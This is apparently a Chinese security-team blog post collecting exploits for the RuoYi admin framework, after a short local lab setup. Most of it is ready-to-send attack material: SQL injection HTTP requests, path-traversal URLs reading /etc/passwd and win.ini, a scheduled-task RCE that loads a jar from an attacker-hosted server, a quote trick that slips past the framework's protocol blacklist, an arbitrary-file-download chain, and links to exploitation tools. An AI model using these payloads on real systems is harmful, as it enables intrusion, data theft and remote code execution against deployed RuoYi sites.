#  【Web渗透】若依框架漏洞合集   
Whoami  晨曦安全团队   2024-02-28 22:29  
  
首先上若依官网下载源码，官网地址：  
https://gitee.com/y_project/RuoYi  
 我选择下载使用的ruoyi V4.5  
1、安装MySQL数据库。  
在本地安装MySQL数据库，我使用的是MySQL8.0.23版本，建议使用新版MySQL，使用MySQL5.几的版本导入若依sql文件会报错。  
MySQL安装教程请自行搜索。  
2、导入若依的sql文件  
若依源码根目录下有一个名为sql的目录，该目录下有两个sql文件。有两种方式进行导入。  
  
（1）使用navicat连接本地MySQL8数据库。  
首先新建一个名为ry的数据库。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwU8rnBQ9qutCibYQrN66eWXfbBOIGdnHrnrtKOW1GgfSSkZOGjrL6lZfg/640?wx_fmt=png&from=appmsg "")  
  
  
选中ry数据库，点击鼠标右键，选择运行SQL文件![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUv1h5lA4f00kXvNZ8oyBRbWibxST40G5vx73NyQeP6ZfIyNK44jSO0Zg/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwU5kga0qu6StLRVfsJB6IAVJjeRIzEIGFg5nfkqXqsjPmicnMC7iauHKNw/640?wx_fmt=png&from=appmsg "")  
  
  
（2）使用IDEA进行数据文件的导入  
首先使用idea新建一个MySQL数据源![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwU8nqmSY1lWoqkZmib30NFcicfVY696g0GkjsjWDHiaKGZeFY8fibavXibRgg/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwU0JGcNwpApSSIdZRFc8yV6gT49uia0cqm03yXxHyq5hxCag7Q1qLaIyw/640?wx_fmt=png&from=appmsg "")  
  
使用IDEA开启一个MySQL控制台，然后再控制台中使用执行以下sql语句新建数据库  
```
ry：create database ry;
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwU1Gs6wcLIib9QibQytvuzTzhK41IGAKPRwRvATeZxQM0Wpcm7cWtgHRAA/640?wx_fmt=png&from=appmsg "")  
  
选中新建的ry数据库，然后新建一个MySQL控制台，然后将若依自带的两个sql文件中的内容粘贴到控制台中进行执行即可。![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUWSWaY2nAw0Y8ZBkQoibdf70iaicV2E3s4vayw09zgvMIdx0xQ9vyld3Uw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUfMJHs4uKp5rjkUINmdZJ3icibhL5BClv7zBBFlgjZ6QloriaCMMJEMUibw/640?wx_fmt=png&from=appmsg "")  
  
3、修改若依配置文件中的MySQL数据库的账号密码。![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUcmEFhs2KQC2YIbfxYL5UkIC7AUGUJB8bdHLQpJAraOJ8H3ickry7taQ/640?wx_fmt=png&from=appmsg "")  
  
4、使用idea启动若依项目即可，若依服务默认在本地的80端口。![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUbY4V6tbKSMT8Ixgx8fLxiakMm9SPHXibwGKCvNjQSnlDyQ7YnlwfArzw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUDq6KsYXgIHBF8LC3cDDEtib2YB1ibqfkhr0CW2XvicH8icAaxtD50ia0Uaw/640?wx_fmt=png&from=appmsg "")  
  
出现上图的图标就证明若依正常运行。  
使用浏览器访问若依后台管理系统，页面如下：![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUUcn4uVpEqWo1Iia1bmYJ42C9rkQW4Czv7qWMlv35wPvgJdu5ibfnHlgg/640?wx_fmt=png&from=appmsg "")  
  
## 若依前台默认shiro key命令执行漏洞  
### 漏洞简介  
  
若依默认使用shiro组件，所以可以试试shiro经典的rememberMe漏洞来getshell。  
### 漏洞复现  
  
直接使用Liqunkit工具梭哈![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwU2kY5EyVuFaAwiab7uIt6sE9xSGDXZUeEYib56DZoiaTRG5eOV0T8PgfcA/640?wx_fmt=png&from=appmsg "")  
  
## 若依后台存在多处sql注入漏洞  
### 漏洞简介  
  
若依后台存在多个SQL注入点  
### 漏洞复现  
  
进入后台后，拦截角色管理页面的请求包![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUdyqicptG3zLSaMXKLJAcCMDVXr0e0e34kAOw0xZeic8vvRV4aqCr17Gg/640?wx_fmt=png&from=appmsg "")  
  
POC：  
```
POST /system/role/list HTTP/1.1
Host: 127.0.0.1
Content-Length: 179
sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/system/role
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014
Connection: close

pageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=&status=&params[beginTime]=&params[endTime]=&params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUkkfXTdYVgquRC2iaBwK6b89Gc2rY2KCiaZl1Up8diciajvvTJ62oK9JPfA/640?wx_fmt=png&from=appmsg "")  
  
第二个sql注入点：角色编辑接口  
POC:  
```
POST /system/dept/edit HTTP/1.1
Host: 127.0.0.1
Content-Length: 111
sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/system/role
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014
Connection: close

DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));#
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUibYl3ic7uI0g80gqSuRZLFDYpGrDL7WG63fRb6hicp0oB2Jiag51ia5wBPg/640?wx_fmt=png&from=appmsg "")  
  
第三个sql注入点POC：  
```
POST /system/role/export HTTP/1.1
Host: 127.0.0.1
Content-Length: 75
sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/system/role
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014
Connection: close

params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUjibicyKHvY710wERNXn2RxX2cHxGD8sb9x8m99qj0SZx418xt2TgFD0w/640?wx_fmt=png&from=appmsg "")  
### RuoYi4.7.5版本后台sql注入  
  
```
ruoyi-4.7.5 后台 com/ruoyi/generator/controller/GenController 下/tool/gen/createTable路由存在sql注入
POC：
sql=CREATE table ss1 as SELECT/**/* FROM sys_job WHERE 1=1 union/**/SELECT/**/extractvalue(1,concat(0x7e,(select/**/version()),0x7e));
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUy8B3QLKe51gSr1Vg2qUHDoAENrzqUicKJU86iaLsDskLWkRCvevl9ECQ/640?wx_fmt=png&from=appmsg "")  
## 若依后台任意文件读取（CNVD-2021-01931）  
### 漏洞简介  
  
若依管理系统是基于springboot的权限管理系统，登录后台后可以读取服务器上的任意文件。影响版本：RuoYi<4.5.1  
### 漏洞复现  
  
POC:  
  
```
/common/download/resource?resource=/profile/../../../../etc/passwd/common/download/resource?resource=/profile/../../../../Windows/win.ini
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwU37s0z8YI0KgS1mT1gKJ4UE9swUdEXqVuRVX45OHSiaialFBWDfvoohkg/640?wx_fmt=png&from=appmsg "")  
  
读取了D盘下的1.txt文件  
## 若依后台定时任务RCE  
### 漏洞简介  
  
由于若依后台计划任务处，对于传入的“调用目标字符串”没有任何校验，导致攻击者可以调用任意类、方法及参数触发反射执行命令。影响版本：RuoYi<4.6.2  
### 漏洞复现  
  
下载payload：  
```
https://github.com/artsploit/yaml-payload
```  
  
  
下载完成之后我们修改一下 AwesomeScriptEngineFactory.java 这个文件![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUf6m78zcWWtfmIYQ3zibdCPbCTojnFyaeuT7VoszChZWm3KuG73Hn91w/640?wx_fmt=png&from=appmsg "")  
  
(mspaint为打开画图板)  
然后切换到yaml-payload-master目录  
编写yaml-payload.yml文件（如果没有自己创建）![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUk65WD0ORDehdEvsl2diaG3gqCiagnibrw9D9U0iaa6zvG8drHfTvPy9KFg/640?wx_fmt=png&from=appmsg "")  
  
然后在该目录下执行以下命令进行编译(java环境使用的是1.8)  
```
javac src/artsploit/AwesomeScriptEngineFactory.java　　　　//编译java文件
jar -cvf yaml-payload.jar -C src/ .　　　　　　　　　　　　　//打包成jar包

```  
  
然后就会生成一个：yaml-payload.jar的jar包  
直接在yaml-payload-master目录下使用python起一个http服务。  
```
python3 -m http.server 5555
```  
  
然后进入若依后台，添加一个计划任务。  
```
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://攻击机ip/yaml-payload.jar"]]]]')
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwU7UffkZvdzrQJGAlqwXFgfow0AG5ib1b1HHzBa4Q7KF0rOcwgkWHbPAA/640?wx_fmt=png&from=appmsg "")  
  
cron表达式：  
0/10 * * * * ?  
这个cron就跟linux定时任务一样,定义每天/每周/等,定时启动的时间  
配置好之后,并不会启动定时任务![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUwuAib5Fr5S9tJIOFnPKvUicU2VSh29JQG3BxXy48QicHVnLEzTia7eghXw/640?wx_fmt=png&from=appmsg "")  
  
计划任务启动之后，即可执行命令mspaint(弹出画图板)![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUB3fI5JGD9vzppRAdYhzcHO4aSqHQ6n9tjmh1A7WBIjBwiaX2LH7FoPg/640?wx_fmt=png&from=appmsg "")  
  
### 版本4.6.2<=Ruoyi<4.7.2  
  
这个版本采用了黑名单限制调用字符串  
- 定时任务屏蔽ldap远程调用  
  
- 定时任务屏蔽http(s)远程调用  
  
- 定时任务屏蔽rmi远程调用![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUSJmpCAmubkHSIYezAM9HQqE3ZJeOe8iaYSribA2FBPniaWTKtebLMriayw/640?wx_fmt=png&from=appmsg "")  
  
ypass  
咱们只需要在屏蔽的协议加上单引号,接着采用之前的方式  
例如:  
  
  
- ```
org.yaml.snakeyaml.Yaml.load(‘!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“h’t’t’p’://127.0.0.1:88/yaml-payload.jar”]]]]’)
```  
  
-   
- 加引号![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUMOz1w1ovTSwtzFq68PXHfQicvia3icLQmnibVOHjSXjS0gycrLibds49lRA/640?wx_fmt=png&from=appmsg "")  
  
  
## 若依后台任意文件下载漏洞  
### 漏洞简介  
  
若依管理系统后台存在任意文件下载漏洞。影响版本：若依管理系统4.7.6及以下版本  
### 漏洞复现  
  
漏洞利用前提：登录进后台。  
首先提交一个定时任务。  
```
POST /monitor/job/add HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 188
Connection: close
Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=61e79ae9-8cdd-4e51-baac-d269ef551df3

createBy=admin&jobName=renwu&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile('c://windows/win.ini')&cronExpression=0%2F15+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUYJZwic4z2kbkO2VEude2gRWxh68pK4K4ygMyLlR9OpsXNhMtEAEOx8Q/640?wx_fmt=png&from=appmsg "")  
  
通过浏览器直接get请求以下地址即可，下载任意文件。  
```
http://127.0.0.1/common/download/resource?resource=c://windows/win.ini:.zip
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyhTTKiad38Hia6rB9VSXB1XwUJsDUUxBcC3FfUrEJvAdWaKGicEHx14Yia8Sic5Y7hibweVtj11Kc1rI4DA/640?wx_fmt=png&from=appmsg "")  
## 若依框架综合利用工具推荐  
  
```
若依漏洞利用工具1：https://github.com/thelostworldFree/Ruoyi-All若依漏洞利用工具2：链接：https://pan.baidu.com/s/1yAUm6CP5uFpUwEqbYeXtCg?pwd=sazx提取码：sazx
```  
  
  
   
  
